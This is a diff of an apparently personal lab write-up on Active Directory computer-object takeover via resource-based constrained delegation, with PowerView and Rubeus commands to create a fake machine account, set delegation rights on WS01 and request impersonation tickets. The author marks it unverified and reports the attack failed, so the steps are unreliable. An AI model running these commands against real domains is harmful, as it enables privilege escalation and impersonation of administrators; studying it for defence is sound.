@@ -1,7 +1,9 @@
 # AD Computer Object Take Over and Privileged Code Execution
 
-{% hint style="info" %}
-WIP - Do not trust
+{% hint style="warning" %}
+**WIP - DO NOT TRUST**
+
+I was not able to replicate this attack in my lab, so if you notice what I did wrong here in my setup or the attack steps, I would like to hear from you.
 {% endhint %}
 
 It's possible to gain code execution with elevated privileges on a computer if you have ownership privileges for the victim's computer AD object.
@@ -13,22 +15,13 @@ This lab is based on a video presented by [@wald0](https://twitter.com/_wald0?la
 |  |  |
 | :--- | :--- |
 | Target computer | WS01 |
-| Admins on target computer | mantvydas |
+| Admins on target computer | spotless@offense.local |
 | Fake computer name | FAKE01 |
-| Fake computer SID |  |
-| Fake computer password |  |
-| Windows 2012 Domain Controller |  |
-|  |  |
+| Fake computer SID | To be retrieved during the attack |
+| Fake computer password | 123456 |
+| Windows 2012 Domain Controller | DC01 |
 
-Getting the target local admin of the system:
-
-```text
-net localgroup administrators
-```
-
-![](../../.gitbook/assets/screenshot-from-2019-03-26-21-34-56.png)
-
-Since the attack will entail creating new computer objects on the domain, let's check if users are allowed to add computers to the domain - by default, a user should be allowed to add up to 10 computers. To check this, we can query the root domain object and look for property `ms-ds-machineaccountquota`
+Since the attack will entail creating new computer objects on the domain, let's check if users are allowed to add computers to the domain. By default, a domain member is usually allowed to add up to 10 computers to the domain. To check this, we can query the root domain object and look for property `ms-ds-machineaccountquota`
 
 ```csharp
 Get-DomainObject -Identity "dc=offense,dc=local" -Domain offense.local
@@ -38,7 +31,7 @@ Get-DomainObject -Identity "dc=offense,dc=local" -Domain offense.local
 
 The attack also requires the DC to be running at least Windows 2012, so let's check if we're in the right environment:
 
-```text
+```csharp
 Get-DomainController
 ```
 
@@ -69,20 +62,20 @@ Checking if the computer got created and noting its SID:
 
 ```csharp
 Get-DomainComputer fake01
-# computer SID: S-1-5-21-2552734371-813931464-1050690807-1153
+# computer SID: S-1-5-21-2552734371-813931464-1050690807-1154
 ```
 
-![](../../.gitbook/assets/screenshot-from-2019-03-26-21-33-04.png)
+![](../../.gitbook/assets/screenshot-from-2019-03-28-22-25-11.png)
 
 Create a new raw security descriptor for the FAKE01$ computer principal:
 
 ```csharp
-$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-2552734371-813931464-1050690807-1153)"
+$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-2552734371-813931464-1050690807-1154)"
 $SDBytes = New-Object byte[] ($SD.BinaryLength)
 $SD.GetBinaryForm($SDBytes, 0)
 ```
 
-![](../../.gitbook/assets/screenshot-from-2019-03-26-21-46-31.png)
+![](../../.gitbook/assets/screenshot-from-2019-03-28-22-26-41.png)
 
 Applying the security descriptor bytes to the target WS01$ machine:
 
@@ -114,11 +107,25 @@ Get-DomainComputer ws01 -Properties 'msds-allowedtoactonbehalfofotheridentity'
 
 ![](../../.gitbook/assets/screenshot-from-2019-03-26-22-41-34.png)
 
+We can test if the security descriptor assigned to computer ws01 in `msds-allowedtoactonbehalfofotheridentity` attribute refers to the fake01$ machine:
+
+```csharp
+(New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0).DiscretionaryAcl
+```
+
+Note that the SID is referring to S-1-5-21-2552734371-813931464-1050690807-1154 which is the fake01$ machine's SID - exactly what it should be:
+
+![](../../.gitbook/assets/screenshot-from-2019-03-28-22-24-04.png)
+
+Let's generate the RC4 hash of the password we set for the FAKE01 computer:
+
 ```csharp
 \\VBOXSVR\Labs\Rubeus\Rubeus\bin\Debug\Rubeus.exe hash /password:123456 /user:fake01 /domain:offense.local
 ```
 
 ![](../../.gitbook/assets/screenshot-from-2019-03-26-22-46-25.png)
+
+Once we have the hash, we can now attempt to execute the attack:
 
 ```csharp
 \\VBOXSVR\Labs\Rubeus\Rubeus\bin\Debug\rubeus.exe s4u /user:fake01$ /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /impersonateuser:spotless /msdsspn:cifs/ws01.offense.local /ptt
@@ -126,7 +133,11 @@ Get-DomainComputer ws01 -Properties 'msds-allowedtoactonbehalfofotheridentity'
 
 ![](../../.gitbook/assets/screenshot-from-2019-03-26-23-40-45.png)
 
+Unfortunately, in my labs, I was not able to replicate the attack even though according to the output of rubeus, all the required kerberos tickets were created successfully - I could not gain remote admin on the target system:
+
 ![](../../.gitbook/assets/screenshot-from-2019-03-26-23-40-57%20%281%29.png)
+
+Once again, checking kerberos tickets on the system showed that I had a ticket for spotless who is a DA and the attack still did not work. If you are reading this and notice what I am doing wrong - I would like to hear from you!
 
 ![](../../.gitbook/assets/screenshot-from-2019-03-28-22-01-23.png)
 
